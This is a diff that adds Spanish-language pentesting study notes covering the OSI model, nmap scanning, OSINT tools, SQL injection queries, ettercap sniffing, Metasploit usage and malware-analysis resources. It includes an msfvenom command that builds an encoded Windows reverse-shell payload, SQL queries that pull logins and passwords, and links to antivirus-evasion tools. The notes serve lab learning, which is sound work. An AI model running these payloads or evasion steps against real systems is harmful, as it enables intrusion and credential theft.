@@ -1,0 +1,516 @@
+#####MODELO OSI #######
+
+- CAPA 1 - FISICA.(Bits)
+	-Señal y transmision binaria
+	-Funciones: Codificacion de datos. Deteccion de colisiones. Modulacion de señal. Procesamiento de la señal. Conversion Analogica.
+	-Protocolos:PPP,Frame Relay,Ethernet, etc...
+	
+- CAPA 2 - ENLACE DE DATOS.(MAC y LLC)
+	-Comunica la capa de red con la capa fisica.
+	-Encargado de transferir de forma fiable dentro del circuito de transferencia de datos.
+	-Funciones: Establecimiento, control y finalizacion de enlaces. Controla el volumen de informacion. Control de errores de Gestion. Evita el flujo que sature el equipo siguiente.
+	-Protoclos: WPA2 y WPA para medios inalambricos.
+	
+- CAPA 3 - RED.(IP)
+	-Permite la comunicacion entre dispositivos que se encuentran en redes distintas.
+	-Funciones: Identificar equipos en la red. Enrutamiento del trafico. Control de la gestion de red.
+	
+- CAPA 4 - TRANSPORTE.(Conexion de Extremo a extremo)
+	-Su objetivo es ofrecer un sistema para envia informacion sin errores a las capas superiorres.
+	-Esta capa toma los datos que vienen de la aplicacion, los divide en segmentos y luego lo envia a la capa de red.
+	-Funciones: Entregar la informacion de forma fidedigna. Brinda la inforamcion en el orden correcto. Gestiona de forma eficiente el flujo de comunicacion.
+	-Protocolos: SSL, TLS o SSH. (TCP y UDP)
+	
+- CAPA 5 - SESION.(Comunicacion entre dispositivos de la red)
+	-Facilita los mecanismos de gestion de session entre la comunicacion de capas susperiores.
+	-Servicios: Control de dialogo. Agrupamiento. Recuperacion.
+	-Protocolos: RPC,SCP,ASP,H.254,L2TP.
+	
+- CAPA 6 - PRESENTACION.(Representacion de los datos)
+	-Servicios: La conversion de los datos a formatos normalizados, sin importar el SO. Comprimir los datos que ocupen el menor numero de bits. Cifrar los datos.
+	-Protoclos: NCP,XDR,AFP
+
+- CAPA 7 - APLICACION.(Servicios de red a aplicaciones)
+	-Responsables de gestionar Informacion de las aplicaciones del cliente.
+	-Esta capa se centra en las comunicaciones.
+	-Protocolos :
+				Correo: SMTP,POP,IMAP
+				WEB: HTTP,HTTPS
+				Transferencia de archivos: FTP, TFTP, SFTP
+				Conexion remota: SSH, RDP, TELNET, DNS, DHCP
+	
+	
+	
+####GESTION DE CONTRASEÑAS #####
+
+https://password.kaspersky.com/es/ -> Te indica si tu contraseña es facil de crackear
+https://haveibeenpwned.com/ -> Comprobar si han comprometido tu correo.
+https://haveibeenpwned.com/Passwords -> comprobar si han comprometido tu password.
+https://passwords.google.com/?pli=1 -> Gestor de contraseña de google
+
+
+
+### Proteccion de red y  Antivirus ####
+https://www.virustotal.com/gui/home/upload -> Analizador de archivos y de url
+-NetSpeedMonitor -> aplicacion para controlar el consumo de red.
+-Fing -> Aplicacion para ver los dispositivos conectados en tu red.
+
+
+####VIRTUAL BOX ####
+https://www.virtualbox.org/wiki/Downloads -> Herramienta para virtualizar S.O
+
+
+### KALI LINUX  - COMANDOS BASICOS ####
+https://www.kali.org/get-kali/  -> descargar Kali linux (Debian 64)
+
+sudo passwd root  -> cambiar la password del usuario root
+
+ping 192.168.1.70 -> hacer un ping a la maquina si el TTL = 64(Linux) si el TLL = 128(Windows)
+
+ifconfig -> ver informacion de red
+
+pwd -> ver la ruta en la que estas
+
+ls -> ver las carpetas
+
+cd -> cambiar de directorio
+
+mkdir -> crear carpeta
+
+nano -> crear un fichero
+
+rm -> eliminar un fichero
+
+rmdir -> eliminar un directorio
+
+cp -> copiar un archivos
+
+mv -> mover un archivos
+
+chmod -> cambiar permisos de un archivo o directorio
+
+clear -> limpiar la terminal
+
+
+##### PYTHON ######
+
+https://www.python.org/downloads/ -> descargar python
+https://jupyter.org/index.html -> ide de python
+https://www.anaconda.com/products/distribution#download-section -> pack de utilidades (Incluye jupyter)
+
+
+#### RECONOCIMIENTO DEL OBJETIVO #####
+
+	###NMAP###
+		namp -> analizar los datos de una red. Puertos y servicios utilizados.
+		 -s -> Hacer el escaneo
+		 -P -> escaneo ICMP para hacer un ping a toda la subred
+		 -n -> para evitar la reolucion de nombres
+		 --open -> puertos abiertos
+		 -vvv -> verbose para que devuelva los puertos segun los encuentra
+		 -sS -> escaneo exhautivo
+		 -p- -> total de rango de puerto existentes (65535)
+		 --min-rate 5000 -> tramitar paquetes no mas lentos de 5000
+		 -Pn -> ping null
+		 > resultado.txt -> guardar el resultado
+		nmap -sP -n 192.168.1.0/24
+		nmap -p- -sV 192.168.1.33  -> Tipo de escaneo no recomendado ya que recorre todos los puertos
+		nmap -sP -n 192.168.1.* --exclude 192.168.0.33  ---> Excluir una IP.
+		nmap -sP -n 192.168.1.* -> ver que maquinas estan levantadas dentro de a red
+		nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.33 -oG allPorts  --> escaneo exhautivo de la maquina a analizar exportar en el fichero allPorts (Formato grepeable)
+		nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.33 -o allPorts 
+
+	###GOOGLE HACKING###
+		-Inurl: resultados específicos de la palabra que aparezca en la URL
+		-Allinurl: de esta forma busca las páginas donde se encuentren todas las palabras en la url
+		-Allintitle: En este caso mostrara los títulos de la página donde se encuentre las palabras que agregamos
+		-intext: Buscamos la palabra dentro del cuerpo del texto en la página.
+		-Info: información sobre una página web
+		-Site: los resultados de una página en concreto
+		-Cache: versión anterior de la web
+
+	###OSRFramework###
+	osrframwork nos permite obtener informacion de usuarios de diferentes sitios como redesSociales
+		-Instalacion:
+			sudo apt update && sudo apt upgrade -y
+			sudo apt install python3.10.7
+			curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
+			Python3 get-pip.py
+			pip install osrframework
+			sudo apt install osrframework
+		-Comandos:
+				-p -> redes spciales
+				all -> todas
+				-n -> nickname o username
+				usufy -n pemaj -p all -> busqueda por usuario
+				mailfy -n pemaj -> busqueda por correo
+				searchfy -q "pepito" -> buscar por nombre y apellidos
+				
+	###SHERLOCK###
+	buscar las diferentes redes sociales que puede tener un usuario
+	https://github.com/sherlock-project/sherlock
+		-instalacion:
+			git clone https://github.com/sherlock-project/sherlock.git
+			cd sherlock
+			python3 -m pip install -r requirements.txt
+		-Comandos:
+			python3 sherlock nombreusuario
+			
+	###ZAP###
+		Buscar vulnabilidades en paginas web.
+		https://www.zaproxy.org/download/
+
+
+####OWASP#####
+Es un top 10 de vulnerabilidades web.
+https://wiki.owasp.org/images/5/5e/OWASP-Top-10-2017-es.pdf
+https://es.wikipedia.org/wiki/OWASP_Top_10
+
+	###SQL INJECTION###
+		ejemplos:
+			https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+			select database()
+			select version()
+			select table_name from information_schemas
+			select table_name from information_schemas.tables where table_schema = database()
+			select group_concat(table_name) from information_schemas.tables where table_schema = database()
+			select group_concat(column) from information_schemas.column where table_schema = 'users'
+			select group_concat(login,password) from users
+			
+		Injeccion de comandos de SO mediante sql:
+			cat /etc/passwd
+			
+		
+		
+		Herramientas de injeccion SQL:
+			https://sqlmap.org/
+			https://github.com/codingo/NoSQLMap
+			https://www.kali.org/tools/jsql/
+			https://github.com/Ekultek/Zeus-Scanner
+			https://github.com/tiankonguse/themole
+			
+	###XML XPATH INJECTION###
+	
+	###AUTHENTICACION Y AUTHORIZACION###
+	
+	###EXPOSICION DE DATOS SENSIBLES###
+		En las cookies se puede encontrar informacion sencible del usuario.
+		
+	###CAPTURAR USUARIO Y PASSWORD QUE VIAJE EN TEXTO PLANO HTTP###
+		Cualquier peticion que no sea https ettercap es capaz de capturar la informacion
+		Ejemplo:
+			ettercap -G 
+			Configurar la red a sniffar
+			
+			
+	###PERDIDA DE CONTROL DE ACCESO###
+		Fallas de la aplicacion que no valida bien los permisos del usuario que esta logeado.
+		2 tipo de fallos : Falla logica. Falla de acceso.
+			
+			
+###METASPLOIT###
+Es un framworkd para el pentisting
+https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ -> Maquina virtual de prueba para practicar con metasploit
+	Instalacion:
+		https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
+		
+		curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \ chmod 755 msfinstall && \./msfinstall
+	
+	Commandos:
+		msfconsole -> inicializar metasploit
+		search windows -> ver los payload de windows
+		Msfdb init –> inicia la base de datos para metasploit
+		Systemctl start postgresql –> inicia base de datos
+		Msfconsole –> ejecutamos el metasploit
+		Db_status –> verificamos la db
+		Help – muestra mucha información de utilidad
+		Set –> es con el comando con el cual settiamos o cambiamos parámetros dentro de metasploit como puertos etc
+		Info –> nos da información del payload o del modulo
+		Banner – >vemos la versión de metasploit
+		Show exploit –> muestra exploit
+		Show payloads –> muestra payloads
+		Search –> busca en base a una palabra
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.33 LPORT=444 -e x86/shikata_ga_nai -f exe > clase.exe   -> generar un payload para windows 
+		back ->volver
+		options -> ver opciones
+		use -> usar un modulo por nombew o numero
+		
+		Realizar un escaneo con metasploit	
+		use auxiliary/scanner/portscan
+		set RHOST 192.168.1.33
+		run
+		
+		Realizar un scaneo mas profundo con nmap
+		Msfdb init -> antes de iniciar metasploit
+		Systemctl start postgresql	 -> antes de iniciar metasploit
+		Msfconsole –> ejecutamos el metasploit	
+		db_nmap -sS -Pn -script vuln 192.168.1.33
+			
+###ANALISIS DE MALWARE###
+	Tipos de Malware:
+		-Minadores -> Utiliza los recursos de la maquina para crear criptomonedas.
+		-Spyware -> Se encarga de recolectar informacion del objetivo sin que se percate.
+		-Keylogger -> registra la informacion que se ingresa por teclado
+		-adware -> Es el tipo de malware que a traves de un pop up o diferentes metodologia muestra publicidad para monetizar.	
+		-rootkit -> Es conocido como un backdoor ya que permite el acceso sin ser detectado.
+		-Ransomware: se replica por la red para cifrar la informacion del ordenador.
+		-troyano: Es capaz de realizar diverssas repercusiones en el sistema y es utilizado con diferentes fines.
+		
+	3 puntos a tener en cuenta para analizar un malware:
+		1.No utilizar la extension-
+		2.Usar siempre el archivo comprimido.
+		3.Usar un entorno virtualizado sin red , carpetas compartidas, usb ...etc
+	
+	Paginas para obtener copias de malware para analizar:
+		http://vxvault.net/ViriList.php
+		https://dasmalwerk.eu/
+		https://thezoo.morirt.com/
+		https://www.malwaredomainlist.com/
+		https://virusshare.com/
+		https://malshare.com/
+		
+	Paginas para analizar malware:
+		https://www.virustotal.com/gui/home/upload
+		
+	Herramientas para el analisis de malware
+		https://mh-nexus.de/en/hxd/
+		HxD -> editor hexadecimal , ver la 1 linea para ver el tipo de archivo(extension)
+		
+		https://www.quickhash-gui.org/
+		quickhash -> evaluar el hash MD5. Hash es un algoritmo matematico. Cada vez que se modifica el archvio el has cambia. Se utiliza para el analisi forense y la cuestodia de fichero legales
+		
+		http://wjradburn.com/software/
+		PEview ->
+		
+		https://www.aldeid.com/wiki/BinText
+		BinText ->
+		
+		https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
+		Procmon -> ver en detalle los proccesos y registros
+		
+		https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns
+		Autoruns64 -> monitorizar
+		
+	https://app.any.run/ -> entorno en la nube para probar un virus en la nube y analizar los cambios que realiza.
+			
+			
+###OCULTAMIENTO DE MALWARE###
+	Diferentes herramientas para ocultar el malware(Hacerlo indetectable).
+		https://www.offensive-security.com/metasploit-unleashed/msfvenom/
+		https://github.com/Screetsec/TheFatRat
+		https://github.com/Veil-Framework/Veil-Evasion			
+			
+			
+			
+###SEGURIDAD MOVIL###
+	Codigos de llamada para saber si nos estan espiando el movil.
+		*#21# -> Llamar desde el movil para ver si tenemos algun desvio de llamadas..etc
+		*#62# -> Saber si tienes algo del movil desviado
+	
+	Aplicaciones de Seguridad.
+		Fing -> ver quien esta conectado en tu red.
+		Termux -> Terminal de comandos.
+		
+	Instalaciones y comandos  en termux.
+		https://github.com/Hydraproject1/Hydra-Project-
+		apt update -> actualizar
+		apt install -> instalar
+		ls	-> listar
+		mkdir -> crear carpeta
+		nano -> crear archivo
+		cd -> mover entre carpetas
+		rm -> eliminar un archvio
+		pwd -> ver donde estamos
+		ifconfig -> informacion de red
+		ping ->
+		termux-change-repo -> seleccionar morro by albatross
+		apt update && upgrade ->
+		apt install git curl wget -y ->
+		termux-setup-storage -> acceder al almacenamiento local del movil para poder instalar
+		pkg install unstable-repo ->
+		apt install vim -y
+		apt install python python2 python3 perl ruby -y
+		apt install php -y
+		apt install crucnh -y
+		apt install hydra -y
+		apt install nmap -y
+		apt install metasploit
+		
+###OWASP MOBILE###
+https://owasp.org/www-project-mobile-top-10/
+https://blog.segu-info.com.ar/2015/03/owasp-mobile-security-espanol.html		
+
+	Ingenieria inversa:
+		https://www.inesem.es/revistadigital/informatica-y-tics/ingenieria-inversa/
+		https://blog.segu-info.com.ar/2019/10/analisis-de-aplicaciones-android-y-ios.html
+		https://blog.segu-info.com.ar/2017/10/apktool-y-swfretools-ingenieria-inversa.html
+		
+		
+	Instalar Android  en virtualbox:
+		https://www.android-x86.org/download.html
+		
+			
+	App para virtualizar android:
+		https://www.bluestacks.com/es/index.html
+	
+	Mobile Security Framewok (MobSF)
+		https://github.com/MobSF/Mobile-Security-Framework-MobSF
+		https://mobsf.github.io/docs/#/installation
+		https://www.youtube.com/watch?v=vN0fp2yEo8o
+		https://www.youtube.com/watch?v=vlH0QxxwCQ0
+		https://www.youtube.com/watch?v=ScaXuwGyaaE
+			
+	Analizar una APK de android:
+		https://github.com/androguard/androguard
+		https://github.com/maaaaz/androwarn
+		https://github.com/payatu/diva-android
+		https://github.com/tjunxiang92/Android-Vulnerabilities
+		https://github.com/OWASP/owasp-mastg/tree/master/Crackmes
+		https://github.com/dineshshetty/Android-InsecureBankv2
+		
+		
+###PRIVACIDAD Y ANONIMATO####
+	VPN: Es una red privada
+	
+	Servidor proxy:
+		https://www.vpnbook.com/webproxy
+		https://hide.me/es/proxy
+	
+	Navegador Thor:
+		https://www.torproject.org/es/download/
+		
+		apt-get install tor
+		service tor start
+		netstat-ano | head
+			Una vez arranncado el servicio hay que configurar el proxy en el navegador
+				-SOCKS_HOST: 127.0.0.1  PORT: 9050
+					-MARCAR OPCION SOCKS_5
+					
+		Orbot proxy tor -> version para android
+		
+
+###GENERAR CLAVE PRIVADA Y PUBLIC###
+	t es el tipo de algoritmo, ya sea rsa, dsa o rsa1.
+	ssh-keygen -t rsa -> generar clave como rsa
+		id_rsa -> clave privada para el servidor
+		id_rsa.pub -> clave publica
+		
+###ANALIZAR EL TRAFICO WIRESHARK###
+	Se encarga de capturar paquetes a traves de la red.
+	Hoy en dia wireshark se usa para auditar la red.
+	
+	Instalar WireShark:
+		https://www.wireshark.org/#download
+		
+			
+###ESTEGANOGRAFIA###
+	Es el arte de ocultar mensajes (Imagenes,MP3,MP4..ETC)		
+	https://www.petitcolas.net/steganography/mp3stego/
+	https://www.spammimic.com/index.cgi	
+	http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm	
+			
+			
+###WEBS DONDE PRATICAR###
+	https://overthewire.org/wargames/bandit/
+	https://app.hackthebox.com/invite
+	https://www.vulnhub.com/
+	https://hacking-lab.com/events/
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+	
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+	
+
+	
